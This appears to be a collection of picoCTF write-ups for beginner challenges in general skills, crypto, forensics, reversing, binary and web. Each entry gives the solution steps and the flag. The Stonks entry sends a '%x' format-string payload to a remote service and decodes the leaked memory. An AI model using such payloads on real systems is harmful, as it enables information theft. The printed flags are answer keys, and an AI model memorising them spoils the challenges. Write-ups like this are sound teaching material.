## Obedient Cat

### Description

This file has a flag in plain sight (aka "in-the-clear"). [Download flag](https://mercury.picoctf.net/static/2d24d50b4ebed90c704575627f1f57b2/flag).

### Information

***Point Value***: 5 points

***Category***:  General Skills

### Hints

1. Any hints about entering a command into the Terminal (such as the next one), will start with a '$'... everything after the dollar sign will be typed (or copy and pasted) into your Terminal.
2. To get the file accessible in your shell, enter the following in the Terminal prompt: `$ wget https://mercury.picoctf.net/static/2d24d50b4ebed90c704575627f1f57b2/flag`
3. `$ man cat`

### Solution
The challenge gives us a link to download a certain data. We can use `wget` command to download data directly from terminal. After that, we get a file named "flags". try using `cat` command to show raw content of file, also we can use `string` command to get all readable content. And then, Voila we get the flag. easy start is it?

### Flag
> picoCTF{s4n1ty_v3r1f13d_f28ac910}


## Mod 26

### Description

Cryptography can be easy, do you know what ROT13 is? `cvpbPGS{arkg_gvzr_V'yy_gel_2_ebhaqf_bs_ebg13_nSkgmDJE}`

### Information

***Point Value***: 10 points

***Category***:  Cryptography

### Hints

1. This can be solved online if you don't want to do it by hand!

### Solution

to solve this challenge i don't want to do it online but with a simple python script

#### solve.py
```
import codecs

strings = "cvpbPGS{arkg_gvzr_V'yy_gel_2_ebhaqf_bs_ebg13_nSkgmDJE}"
print(codecs.encode(strings, 'rot_13'))

```

### Flag
> picoCTF{next_time_I'll_try_2_rounds_of_rot13_aFxtzQWR}


## Python Wrangling

### Description

Python scripts are invoked kind of like programs in the Terminal... Can you run [this Python script](https://mercury.picoctf.net/static/0bf545252b5120845e3b568b9ad0277e/ende.py) using [this password](https://mercury.picoctf.net/static/0bf545252b5120845e3b568b9ad0277e/pw.txt) to get [the flag](https://mercury.picoctf.net/static/0bf545252b5120845e3b568b9ad0277e/flag.txt.en)?

### Information

***Point Value***: 10 points

***Category***:  General Skills

### Hints

1. Get the Python script accessible in your shell by entering the following command in the Terminal prompt: `$ wget https://mercury.picoctf.net/static/0bf545252b5120845e3b568b9ad0277e/ende.py`
2. `man python`

### Solution

Download all sources first using `wget` command. We must get the python script, encryption text and password. And then, See what python script actually does.Now we are ready to decrypt the message using the command `python ende.py -d <encrypt_file_path.txt.en>`. Last, don`t forget to insert password correctly.
> python ende.py -d flag.txt.en
> Please enter the password:6008014f6008014f6008014f6008014f

### Flag
> picoCTF{4p0110_1n_7h3_h0us3_6008014f}


## Wave a flag

### Description

Can you invoke help flags for a tool or binary? [This program](https://mercury.picoctf.net/static/b28b6021d6040b086c2226ebeb913bc2/warm) has extraordinarily helpful information...

### Information

***Point Value***: 10 points

***Category***:  General Skills

### Hints

1. This program will only work in the webshell or another Linux computer.
2. To get the file accessible in your shell, enter the following in the Terminal prompt: `$ wget https://mercury.picoctf.net/static/b28b6021d6040b086c2226ebeb913bc2/warm`
3. Run this program by entering the following in the Terminal prompt: `$ ./warm`, but you'll first have to make it executable with `$ chmod +x warm`
4. -h and --help are the most common arguments to give to programs to get more information from them!
5. Not every program implements help features like -h and --help.

### Solution

we have an ELF file. Try to run this, but change the access permission first with `chmod +x` to make file executable
> chmod +x warm\
> ./warm

output:
> Hello user! Pass me a -h to learn what I can do!

Try to add more arguments with pass an "-h" to the program
> ./warm -h


### Flag
> picoCTF{b1scu1ts_4nd_gr4vy_d6969390}


## information

### Description

Files can always be changed in a secret way. Can you find the flag? [cat.jpg](https://mercury.picoctf.net/static/c28a959c5605d5f67480d5dd3a77f302/cat.jpg)

### Information

***Point Value***: 10 points

***Category***:  Forensics

### Hints

1. Look at the details of the file
2. Make sure to submit the flag as picoCTF{XXXXX}

### Solution

The hint is "look at the detail of the file", so lets try to look deeper at the file, yeap we are going through metadata of file. We need the tools called exiftool. type "exiftool cat.jpg" on the terminal. 
> exiftool cat.jpg

```
ExifTool Version Number         : 12.41
File Name                       : cat.jpg
Directory                       : .
File Size                       : 858 KiB
File Modification Date/Time     : 2021:03:16 01:24:46+07:00
File Access Date/Time           : 2022:07:12 08:41:46+07:00
File Inode Change Date/Time     : 2022:07:12 08:41:46+07:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.02
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Current IPTC Digest             : 7a78f3d9cfb1ce42ab5a3aa30573d617
Copyright Notice                : PicoCTF
Application Record Version      : 4
XMP Toolkit                     : Image::ExifTool 10.80
License                         : cGljb0NURnt0aGVfbTN0YWRhdGFfMXNfbW9kaWZpZWR9
Rights                          : PicoCTF
Image Width                     : 2560
Image Height                    : 1598
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 2560x1598
Megapixels                      : 4.1
```

In here we got a bunch of information. If we focus on the "License" i think it is a string encrypt with base64. So lets decrypt it. We have to use `grep` and `sed` command to catch the string and base64 decode to decrypt the string, or the easiest way is copy and paste that string lmao. Without a further ado, type this command on the terminal `exiftool cat.jpg | grep 'License' | sed 's/.*: //' | base64 -d`

> exiftool cat.jpg | grep 'License'
```
License                         : cGljb0NURnt0aGVfbTN0YWRhdGFfMXNfbW9kaWZpZWR9
```
> exiftool cat.jpg | grep 'License' | sed 's/.*: //'
```
cGljb0NURnt0aGVfbTN0YWRhdGFfMXNfbW9kaWZpZWR9
```
Now we got a string. Time to decrypt
> exiftool cat.jpg | grep 'License' | sed 's/.*: //' | base64 -d

### Flag
> picoCTF{the_m3tadata_1s_modified}


## Nice netcat...

### Description

There is a nice program that you can talk to by using this command in a shell: `$ nc mercury.picoctf.net 22342`, but it doesn't speak English...

### Information

***Point Value***: 15 points

***Category***:  General Skills

### Hints

1. You can practice using `netcat` with this picoGym problem: [what's a netcat?](https://play.picoctf.org/practice/challenge/34)
2. You can practice reading and writing ASCII with this picoGym problem: [Let's Warm Up](https://play.picoctf.org/practice/challenge/22)

### Solution

If we run nc from the terminal, the output is only number. I think its a decimal number from ascii. Therefore, we need to convert that decimal to char. In this situation we can use `awk` command. Try to run this: 
> nc mercury.picoctf.net 22342 | awk '{printf "%c",$1}'

### Flag
> picoCTF{g00d_k1tty!_n1c3_k1tty!_5fb5e51d}


## Transformation

### Description

I wonder what this really is... [enc](https://mercury.picoctf.net/static/e47483f88b12f2ab0c46315afc12f64d/enc) `''.join([chr((ord(flag[i]) << 8) + ord(flag[i + 1])) for i in range(0, len(flag), 2)])`

### Information

***Point Value***: 20 points

***Category***:  Reverse Engineering

### Hints

1. You may find some decoders online

### Solution

The challenge gives us encryption algorithm, and encrypted text. So we can get the flag by reversing that algorithm. I have created a simple python script to solve this challenge. Run this script:

#### solve.py
```
encrypted_text = '灩捯䍔䙻ㄶ形楴獟楮獴㌴摟潦弸彥ㄴㅡて㝽'
for i in encrypted_text:
    i = ord(i)
    belakang = str(bin(i)[-7:])
    print(f"{chr(i>>8)}{chr(int(belakang,2))}",end='')
```

### Flag
> picoCTF{16_bits_inst34d_of_8_e141a0f7}


## Stonks

### Description

I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure! [vuln.c](https://mercury.picoctf.net/static/f9d545499faf6f436853685ad21dcb33/vuln.c) `nc mercury.picoctf.net 33411`

### Information

***Point Value***: 20 points

***Category***:  Binary Exploitation

### Hints

1. Okay, maybe I'd believe you if you find my API key.

### Solution

 The Vulnerability of this program is on the statement below.  
 ```
 scanf("%300s", user_buf);
 printf(user_buf);
 ```
 
We can figure out the system data with input user. Try to put this string `"%x%x%x%x%x%x%x"` in input (length of the string is what you want). he output will contain a hex digit which might be a flag. I have been make an input in "input" file (we only use fitur 1 [buy some stonks] because the vuln command is on that).

> nc mercury.picoctf.net 33411\
> 1\
> %x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x

And we got this:
> 8271410804b00080489c3f7f14d80ffffffff1826f160f7f22110f7f14dc708270180882713f082714106f6369707b465443306c5f49345f74356d5f6c6c306d5f795f79336e6334326136613431fff7007df7f4faf8

We can easily convert that in [online converter](https://www.rapidtables.com/convert/number/hex-to-ascii.html)
> ocip{FTC0l_I4_t5m_ll0m_y_y3nc42a6a41ÿ£}

after a few seconds we've got the flag, but not done here. It's looks like a little endian so we have to reverse every 4 digits with [python script](https://github.com/snykk/CTF-WriteUps/blob/master/PicoCTF/Binary%20Exploitation/Stonks/reverse.py)  for a tiny automation

### Flag
> picoCTF{I_l05t_4ll_my_m0n3y_a24c14a6}


## GET aHEAD

### Description

Find the flag being held on this server to get ahead of the competition [http://mercury.picoctf.net:15931/](http://mercury.picoctf.net:15931/)

### Information

***Point Value***: 20 points

***Category***:  Web Exploitation

### Hints

1. Maybe you have more than 2 choices
2. Check out tools like Burpsuite to modify your requests and look at the responses

### Solution
We can use the burpsuite suite to handle and manipulate requests. change "GET" method to "HEAD" and we can see the difference in response

### Flag
> picoCTF{r3j3ct_th3_du4l1ty_82880908}
